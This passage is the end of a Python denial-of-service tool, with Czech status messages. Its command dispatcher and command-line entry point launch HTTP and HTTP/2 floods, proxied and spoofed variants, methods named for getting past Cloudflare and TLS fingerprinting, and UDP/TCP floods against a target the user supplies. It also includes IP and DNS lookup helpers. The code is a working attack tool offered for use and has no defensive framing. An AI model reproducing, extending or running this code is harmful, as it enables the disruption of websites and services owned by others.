    elif cmd in ("sky", "SKY"):
        target, thread, t = get_info_l7()
        th = threading.Thread(target=attackSTELLAR, args=(target, t, thread)); th.daemon = True; th.start()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
    elif cmd in ("http2", "HTTP2"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchHTTP2(target, thread, t); timer.join()

    # --- s proxy ---
    elif cmd in ("pxraw", "PXRAW"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXRAW(target, thread, t); timer.join()
    elif cmd in ("pxsoc", "PXSOC"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXSOC(target, thread, t); timer.join()
    elif cmd in ("pxspoof", "PXSPOOF"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXSPOOF(target, thread, t); timer.join()
    elif cmd in ("pxsky", "PXSKY"):
        if get_proxies():
            target, thread, t = get_info_l7()
            th = threading.Thread(target=attackSKY, args=(target, t, thread)); th.daemon = True; th.start()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
    elif cmd in ("pxhttp2", "PXHTTP2"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXHTTP2(target, thread, t); timer.join()

    # --- CF ---
    elif cmd in ("cfb", "CFB"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchCFB(target, thread, t); timer.join()
    elif cmd in ("pxcfb", "PXCFB"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXCFB(target, thread, t); timer.join()
    elif cmd in ("cffi", "CFFI"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchCFFI(target, thread, t); timer.join()
    elif cmd in ("pxcffi", "PXCFFI"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXCFFI(target, thread, t); timer.join()
    elif cmd in ("tlsc", "TLSC"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchTLSC(target, thread, t); timer.join()
    elif cmd in ("pxtlsc", "PXTLSC"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchPXTLSC(target, thread, t); timer.join()

    # --- H2BOMB ---
    elif cmd in ("h2bomb", "H2BOMB"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchH2BOMB(target, thread, t, use_proxy=False); timer.join()
    elif cmd in ("pxh2bomb", "PXH2BOMB"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start()
            LaunchH2BOMB(target, thread, t, use_proxy=True); timer.join()

    # --- Layer 4 ---
    elif cmd in ("udp", "UDP"):
        target, port, thread, t = get_info_l4()
        th = threading.Thread(target=runsender, args=(target, port, t, thread)); th.daemon = True; th.start()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
    elif cmd in ("tcp", "TCP"):
        target, port, thread, t = get_info_l4()
        th = threading.Thread(target=runflooder, args=(target, port, t, thread)); th.daemon = True; th.start()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()

    # --- Tools ---
    elif cmd == "subnet":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}", timeout=10)
            print(r.text)
        except Exception: print('API error')
    elif cmd == "dns":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}", timeout=10)
            print(r.text)
        except Exception: print('API error')
    elif cmd == "geoip":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}", timeout=10)
            print(r.text)
        except Exception: print('API error')
    else:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "Unknown command. type 'help'.\n")


# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    init(convert=True)
    ua = load_ua()
    proxies = []

    if len(sys.argv) == 5:
        method = sys.argv[1]
        target = sys.argv[2]
        thread = sys.argv[3]
        t = sys.argv[4]

        if method.startswith("px"):
            get_proxies()

        if method == "get":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchRAW(target, thread, t); timer.join()
        elif method == "post":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPOST(target, thread, t); timer.join()
        elif method == "head":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchHEAD(target, thread, t); timer.join()
        elif method == "soc":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchSOC(target, thread, t); timer.join()
        elif method == "spoof":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchSPOOF(target, thread, t); timer.join()
        elif method == "pps":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPPS(target, thread, t); timer.join()
        elif method == "pxsoc":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXSOC(target, thread, t); timer.join()
        elif method == "pxspoof":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXSPOOF(target, thread, t); timer.join()
        elif method == "pxraw":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXRAW(target, thread, t); timer.join()
        elif method == "cfb":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchCFB(target, thread, t); timer.join()
        elif method == "pxcfb":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXCFB(target, thread, t); timer.join()
        elif method == "cffi":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchCFFI(target, thread, t); timer.join()
        elif method == "pxcffi":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXCFFI(target, thread, t); timer.join()
        elif method == "tlsc":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchTLSC(target, thread, t); timer.join()
        elif method == "pxtlsc":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXTLSC(target, thread, t); timer.join()
        elif method == "h2bomb":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchH2BOMB(target, thread, t, use_proxy=False); timer.join()
        elif method == "pxh2bomb":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchH2BOMB(target, thread, t, use_proxy=True); timer.join()
        elif method == "http2":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchHTTP2(target, thread, t); timer.join()
        elif method == "pxhttp2":
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); LaunchPXHTTP2(target, thread, t); timer.join()
        elif method == "sky":
            th = threading.Thread(target=attackSTELLAR, args=(target, t, thread)); th.daemon = True; th.start()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
        elif method == "pxsky":
            th = threading.Thread(target=attackSKY, args=(target, t, thread)); th.daemon = True; th.start()
            timer = threading.Thread(target=countdown, args=(t,)); timer.start(); timer.join()
        else:
            print(f"Neznama metoda: {method}")
            sys.exit()
        sys.exit()

    clear()
    title()
    stdout.write(Fore.LIGHTCYAN_EX + " [*] " + Fore.WHITE + f"Nacteno {len(ua)} User-Agentu\n")
    if HAS_CURL_CFFI:
        stdout.write(Fore.LIGHTCYAN_EX + " [*] " + Fore.WHITE + "curl_cffi: OK\n")
    else:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "curl_cffi: CHYBI\n")
    if HAS_TLS_CLIENT:
        stdout.write(Fore.LIGHTCYAN_EX + " [*] " + Fore.WHITE + "tls_client: OK\n")
    else:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "tls_client: CHYBI\n")
    if HAS_H2:
        stdout.write(Fore.RED + " [*] " + Fore.WHITE + "h2bomb: OK (HTTP/2 Bomb)\n")
    else:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "h2bomb: CHYBI (pip install h2)\n")
    stdout.write("\n")

    while True:
        command()
